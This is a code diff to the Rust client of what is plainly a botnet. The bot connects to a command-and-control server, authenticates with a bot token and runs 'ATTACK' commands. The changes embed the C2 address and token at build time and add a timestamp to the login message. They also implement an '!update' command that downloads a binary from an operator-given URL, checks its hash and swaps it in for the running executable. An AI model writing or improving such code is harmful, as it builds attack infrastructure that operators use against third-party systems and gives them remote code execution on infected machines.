@@ -17,8 +17,6 @@ const MAX_CONCURRENT_ATTACKS: usize = 5;
 use sha2::{Sha256, Digest};
 use hex;
 
-// ...existing code...
-
 #[derive(Debug)]
 struct PinnedCertificateVerifier {
     pinned_hash: String,
@@ -88,11 +86,10 @@ impl rustls::client::danger::ServerCertVerifier for PinnedCertificateVerifier {
     }
 }
 
-// ...existing code...
-
 async fn connect_and_run(state: Arc<BotState>) -> Result<()> {
-    let c2_address = get_c2_address();
-    let stream = TcpStream::connect(&c2_address).await?;
+    // C2 Address is now injected at build time for security
+    let c2_address = env!("C2_ADDRESS");
+    let stream = TcpStream::connect(c2_address).await?;
     stream.set_nodelay(true)?; 
     tracing::info!("[OK] Connected to C2 server at {}", c2_address);
 
@@ -107,13 +104,17 @@ async fn connect_and_run(state: Arc<BotState>) -> Result<()> {
         .with_no_client_auth();
         
     let connector = TlsConnector::from(Arc::new(config));
-// ...existing code...
     let domain = rustls::pki_types::ServerName::try_from("localhost")
         .map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidInput, "invalid dns name"))?;
     let mut conn = connector.connect(domain, stream).await?;
-    let bot_token = get_bot_token();
+    // Bot Token is now injected at build time
+    let bot_token = env!("BOT_TOKEN");
     let version = "2.0";
-    let auth_msg = format!("AUTH {} {}\n", bot_token, version);
+    let timestamp = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_secs();
+    let auth_msg = format!("AUTH {} {} {}\n", bot_token, version, timestamp);
     conn.write_all(auth_msg.as_bytes()).await?;
     let mut auth_response = vec![0u8; 64];
     let n = conn.read(&mut auth_response).await?;
@@ -287,8 +288,30 @@ async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
             }
         }
         "!update" => {
-             // Basic update stub - in production this would download a signed binary
-             tracing::info!("Update command received - not fully implemented without update server URL");
+            if fields.len() >= 3 {
+                let url = fields[1];
+                let checksum = fields[2].to_string();
+                
+                if !url.starts_with("https://") {
+                    tracing::error!("Update failed: HTTPS required for security");
+                    return Ok(());
+                }
+
+                tracing::info!("Update command received. URL: {}", url);
+                
+                // Spawn update task
+                let url = url.to_string();
+                tokio::spawn(async move {
+                    if let Err(e) = perform_update(&url, checksum).await {
+                        tracing::error!("Update failed: {}", e);
+                    } else {
+                        tracing::info!("Update successful - restarting...");
+                        std::process::exit(0); // Service manager/cron will restart it
+                    }
+                });
+            } else {
+                tracing::error!("Update failed: Missing URL or Checksum (Usage: !update <url> <checksum>)");
+            }
         }
         "ATTACK" => {
             handle_v2_attack_command(&fields, state).await?;
@@ -551,5 +574,41 @@ async fn handle_attack_command(cmd: &str, fields: &[&str], state: Arc<BotState>)
         drop(permit); 
     });
     state.attack_handles.lock().await.insert(attack_id, handle);
+    Ok(())
+}
+async fn perform_update(url: &str, expected_checksum: String) -> Result<()> {
+    let response = reqwest::get(url).await?;
+    let bytes = response.bytes().await?;
+    
+    let mut hasher = Sha256::new();
+    hasher.update(&bytes);
+    let hash = hex::encode(hasher.finalize());
+    if hash != expected_checksum {
+        return Err(anyhow::anyhow!("Checksum mismatch! Expected {}, got {}", expected_checksum, hash));
+    }
+
+    let current_exe = std::env::current_exe()?;
+    let tmp_path = current_exe.with_extension("tmp");
+    
+    tokio::fs::write(&tmp_path, bytes).await?;
+    
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        let mut perms = tokio::fs::metadata(&tmp_path).await?.permissions();
+        perms.set_mode(0o755);
+        tokio::fs::set_permissions(&tmp_path, perms).await?;
+    }
+
+    // Rename current to .bak (Windows requirement, good practice on Linux too)
+    let bak_path = current_exe.with_extension("bak");
+    if bak_path.exists() {
+        let _ = tokio::fs::remove_file(&bak_path).await;
+    }
+    
+    // On Linux we can just rename over. On Windows we must move the running exe first.
+    tokio::fs::rename(&current_exe, &bak_path).await?;
+    tokio::fs::rename(&tmp_path, &current_exe).await?;
+    
     Ok(())
 }
